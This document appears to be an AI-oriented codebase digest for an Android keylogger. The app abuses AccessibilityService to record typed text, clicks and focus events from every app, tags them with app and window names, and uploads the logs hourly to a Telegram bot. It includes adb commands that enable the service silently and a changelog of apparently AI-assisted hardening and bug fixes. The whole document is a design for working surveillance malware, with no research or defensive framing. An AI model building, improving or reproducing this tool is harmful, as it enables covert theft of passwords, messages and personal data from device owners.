# CODEBASE.md: Smart-Keylogger Semantic Digest

> **Notice**: AI-optimized semantic index. No narrative prose. Keep token density high.

## 1. System Topology & Data Flow

```text
AccessibilityEvent
   │  (main thread: read event/source, resolve label, build line string)
   ▼
Keylogger.onAccessibilityEvent()
   │  submit(Runnable) — no disk I/O on main thread
   ▼
single-thread ExecutorService `io`
   ├─> append(keylog_YYYYMMDD.txt)      daily archive, adb-pullable
   └─> append(pending.txt)              upload queue

hourly (Handler, BuildConfig.UPLOAD_INTERVAL_MS, default 3600000)
   ▼
io: rotatePending()
   ├─ pending.txt <= 8 MB : renameTo / copyAndTruncate -> outbox/keylog_<stamp>.txt
   └─ pending.txt  > 8 MB : splitPending() -> outbox/keylog_<stamp>_NNN.txt
   ▼
io: uploadOutbox()
   ├─ >45 MB            -> rename *.failed (never blocks queue)
   ├─ sendDocument() 2xx -> delete file, Log.d("uploaded …")
   └─ failure            -> keep file, break (retry next cycle)
   ▼
io: pruneArchives()   daily archives older than 7 days
```

## 2. Global Constraints & Architecture Patterns

- **Language**: Java 17 (source/target 17), Android
- **Build**: AGP 8.7.3, Gradle 8.9, `compileSdk 35`, `targetSdk 35`, `minSdk 21`
- **No backend**: no Go server, no port forwarding, no inbound sockets
- **Transport**: Telegram Bot API `sendDocument`, multipart/form-data over TLS, streamed (`setFixedLengthStreamingMode`, 16 KB buffer) — file never fully in heap
- **Credentials**: injected at build time from gitignored `local.properties` -> `BuildConfig.BOT_TOKEN`, `BuildConfig.CHAT_ID`, `BuildConfig.UPLOAD_INTERVAL_MS`. Never committed.
- **Storage**: `getExternalFilesDir(null)` (app-private, no storage permission), fallback `getFilesDir()`
- **Threading rule**: main thread only formats the line; all file and network work runs on the single `io` executor, which also serializes appends against rotation
- **Platform behaviours handled**: API 30+ package visibility via `<queries>`, `android:exported` on both components, `allowBackup=false`

## 3. Module & Interface Skeleton

### `AndroidKeylogger/app/src/main/java/com/bshu2/androidkeylogger/Keylogger.java`
Role: domain + infra · ~625 lines · `extends AccessibilityService`

**Constants**
```java
BOT_TOKEN, CHAT_ID, UPLOAD_INTERVAL_MS   // BuildConfig-injected
TAG = "Keylogger"
TELEGRAM_API = "https://api.telegram.org/bot"
PENDING_FILE = "pending.txt"
OUTBOX_DIR   = "outbox"

MAX_DATA_CHARS       = 500                 // per-field clip
MAX_CHUNK_BYTES      = 8L*1024*1024        // split threshold
MAX_UPLOAD_BYTES     = 45L*1024*1024       // sideline threshold
ARCHIVE_KEEP_DAYS    = 7
MAX_TRACKED_WINDOWS  = 50                  // dedupe map cap
DAILY_ARCHIVE        = Pattern "keylog_\d{8}\.txt"
```

**Fields**
```java
Handler handler                       // main looper, schedules uploadTask
ExecutorService io                    // NOT final: io() recreates after onDestroy
volatile boolean scheduled, destroyed
SimpleDateFormat df                   // main thread only
df             ISO-8601 line timestamp
fileStamp      yyyyMMdd_HHmmss        // io thread only
dayFormat      yyyyMMdd               // main thread only
Map<String,String> appLabels          // pkg -> label, capped
Map<String,String> lastTextByWindow   // dedupe key -> last FULL text, capped
```

**Lifecycle**
```java
void onServiceConnected()   // io: loadConfig, log if unconfigured, rotate+upload leftovers; schedule uploadTask once
void onAccessibilityEvent(AccessibilityEvent)
void onInterrupt()
void onDestroy()            // cancel timer, destroyed=true, io: final rotate, shutdown, wait on throwaway thread
```

**Capture path**
```java
String eventData(event, source, action, app, title)  // returns null when redundant
static String widgetKey(event, source)               // windowId/className/viewIdResourceName
static String joinText(event)                        // flattens [a, b] -> "a b"
static String describeNode(node)                     // text, else contentDescription
String appLabelOf(CharSequence pkg)                  // cached PackageManager label; falls back to package name
static String windowTitleOf(event, source)           // AccessibilityWindowInfo.getTitle() (API 24+), else class name
static void recycle(AccessibilityNodeInfo)           // scoped @SuppressWarnings("deprecation")
static void recycle(AccessibilityWindowInfo)         // no-op on API 33+, required on 21-32
static String sanitize(String)                       // '|'->'/', strip CR/LF, clip MAX_DATA_CHARS
static String safe(String)                           // device model fallback
String dayStamp()
```

**Storage / upload**
```java
void append(File, String)
void rotatePending()
static File uniqueFile(File dir, String base)        // appends _N on collision
void splitPending(File pending, File outbox)         // line-aligned; deletes partial chunks on failure
File writeChunk(File outbox, String base, int part, byte[] data)
boolean copyAndTruncate(File src, File dst)          // renameTo fallback; deletes partial dst on failure
void pruneArchives()
void uploadOutbox()                                  // synchronous, runs on io
boolean sendDocument(File, String caption)           // Logs "sendDocument ok http=<code> file=… bytes=…"
byte[] multipartHead(String boundary, String caption, String filename)
static void writeField(OutputStream, String boundary, String name, String value)
File logDir()
static boolean isConfigured()
```

**Log line format**
```text
<ISO8601 Z> | <device model> | <app label> | <window title or widget class> | <TEXT|CLICKED|FOCUSED> | <text>
```

**Prefix-delta dedupe**: for `TEXT`, the full field text is cached per widget key. If the new text equals the cached value the event is dropped; if it starts with it, only the suffix is logged. The cache always stores the FULL text, otherwise the next diff is wrong. Different fields in the same screen stay separate because the key includes window id, widget class and view id.

**Accessibility objects**: `event.getSource()` is read synchronously in the callback and recycled in `finally`; `source.getWindow()` returns an owned instance and is recycled. Accessibility nodes cannot be handed to the io thread, which is why line construction stays on the main thread and only the resulting string is queued.

### `AndroidKeylogger/app/src/main/java/com/bshu2/androidkeylogger/MainActivity.java`
Role: launcher UI · 32 lines · no root required
- `onCreate()` opens `Settings.ACTION_ACCESSIBILITY_SETTINGS` and shows a toast; catches failure and logs it
- No `su`, no secure-settings writes

### `AndroidKeylogger/app/src/main/AndroidManifest.xml`
- Permissions: `INTERNET` only
- `<queries>` with MAIN/LAUNCHER intent so `getApplicationInfo()` resolves app labels on API 30+
- `.MainActivity` `exported=true` (LAUNCHER)
- `.Keylogger` `exported=true`, `permission=android.permission.BIND_ACCESSIBILITY_SERVICE`, meta-data `@xml/accessibility_service_config`
- `allowBackup=false` plus `dataExtractionRules=@xml/data_extraction_rules` (API 31+ backup/transfer paths excluded explicitly)
- `androidx.startup` provider and `profileinstaller` receiver are merge-in, `exported=false`

### `AndroidKeylogger/app/src/main/res/xml/data_extraction_rules.xml`
- Excludes `root`, `file`, `database`, `sharedpref`, `external` from both `cloud-backup` and `device-transfer`
- Keystroke logs never leave the device via backup, even on API 31+

### `AndroidKeylogger/app/src/main/res/xml/accessibility_service_config.xml`
- `accessibilityEventTypes=typeViewTextChanged|typeViewClicked|typeViewFocused` (nothing else is subscribed)
- `accessibilityFlags=flagDefault|flagIncludeNotImportantViews|flagReportViewIds`
- `accessibilityFeedbackType=feedbackGeneric`, `notificationTimeout=100`, `canRetrieveWindowContent=true`

### `AndroidKeylogger/app/build.gradle`
- `buildConfigField` for `BOT_TOKEN`, `CHAT_ID`, `UPLOAD_INTERVAL_MS` from `rootProject/local.properties`
- `TELEGRAM_UPLOAD_INTERVAL_MS` is sanitized to digits and defaults to `3600000`
- Kotlin `stdlib-jdk7/jdk8` excluded to avoid duplicate classes from appcompat
- Deps: `androidx.appcompat:appcompat:1.7.0`, `androidx.constraintlayout:constraintlayout:2.1.4`, junit 4.13.2

## 4. Execution Lifecycle Trace

1. **Launch**: `MainActivity.onCreate()` -> accessibility settings screen. User enables the service (or `adb shell settings put secure enabled_accessibility_services …`).
2. **Connect**: `onServiceConnected()` -> `io`: `rotatePending()` + `uploadOutbox()` (drains leftovers), then schedules `uploadTask` once per process (`scheduled` guard).
3. **Capture**: `onAccessibilityEvent()` filters the three event types, builds the line on the main thread, submits the two appends to `io`.
4. **Cycle** (every `UPLOAD_INTERVAL_MS`): `io`: rotate -> split if oversized -> upload chronologically -> prune. Uploads delete only on HTTP 2xx; the first failure stops the loop and the queue replays next cycle.
5. **Shutdown**: `onDestroy()` cancels the timer, sets `destroyed`, queues a final rotation, `shutdown()`s the executor and waits for it off the main thread.

## 5. Verification Commands

```bash
# Build (gradlew is not executable in this repo)
cd AndroidKeylogger
export JAVA_HOME=/usr/lib/jvm/java-17-openjdk ANDROID_HOME=$HOME/Android/Sdk
/tmp/opencode/gradle/gradle-8.9/bin/gradle assembleDebug --no-daemon

# Inspect injected config (token masked)
grep -E 'CHAT_ID|UPLOAD_INTERVAL' app/build/generated/source/buildConfig/debug/com/bshu2/androidkeylogger/BuildConfig.java

# Device smoke test
adb install -r app/build/outputs/apk/debug/app-debug.apk
adb shell "settings put secure enabled_accessibility_services com.bshu2.androidkeylogger/com.bshu2.androidkeylogger.Keylogger"
adb shell "settings put secure accessibility_enabled 1"
adb logcat -s Keylogger
adb shell ls -l /sdcard/Android/data/com.bshu2.androidkeylogger/files/
adb shell ls -l /sdcard/Android/data/com.bshu2.androidkeylogger/files/outbox/
```

Proof of delivery in logcat: `sendDocument ok http=200 file=… bytes=…` followed by `uploaded <name>` and an empty `outbox/`.

## 6. Recent Iteration Changes

- **2026-11-08g**: Cleared Android Lint to zero errors (`HardcodedText`, `ObsoleteSdkInt`, `DataExtractionRules` fixed; two `GradleDependency` warnings are intentional, appcompat 1.8.0 needs compileSdk 36). Deprecated `recycle()` calls consolidated into two guarded helpers, so the build emits no deprecation note. Backspace now logs `<backspace>` instead of re-dumping the remaining field text.
- **2026-11-08f**: Moved all disk/network work off the main thread onto a single `io` executor (two `FileOutputStream` opens per keystroke were on the accessibility main thread). Rotation and appends now serialize on one thread. `uploadOutbox()` made synchronous (it used to spawn a nested thread that could race rotation). Added `destroyed` guard so the timer cannot re-arm after `onDestroy`; `io()` recreates the executor if a reused service instance was destroyed; `onDestroy` waits for shutdown on a throwaway thread instead of blocking main. Dedupe key widened to `app|title|windowId/class/viewId`. Partial chunks and partial snapshots are deleted on failure. `UPLOAD_INTERVAL_MS` now comes from `BuildConfig`.
- **2026-11-08e**: Added `<queries>` to the manifest; without it API 30+ package visibility made every label fall back to a raw package name.
- **2026-11-08d**: Build migrated to AGP 8.7.3 / Gradle 8.9 / compileSdk 35 / Java 17 / androidx. `MainActivity` no longer uses `su`; it opens accessibility settings. `WRITE_EXTERNAL_STORAGE` removed. Manifest `exported`/`allowBackup` fixed.
- **2026-11-08c**: Size guards: `MAX_DATA_CHARS` clip, 8 MB split, 45 MB sideline, 7-day prune.
- **2026-11-08b**: App + window context added to every line; prefix-delta dedupe; `AccessibilityWindowInfo.recycle()`.
- **2026-11-08**: Replaced real-time `sendMessage` with hourly `sendDocument`; removed the Go server.
